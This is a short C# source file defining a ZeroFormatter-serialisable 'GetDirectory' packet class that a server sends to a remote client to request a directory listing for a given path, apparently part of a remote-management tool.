using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetDirectory : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetDirectory;
            }
        }

        [Index(0)]
        public virtual string remotePath { get; set; }

        public GetDirectory()
        {
        }

        public GetDirectory(string remotePath)
        {
            this.remotePath = remotePath;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
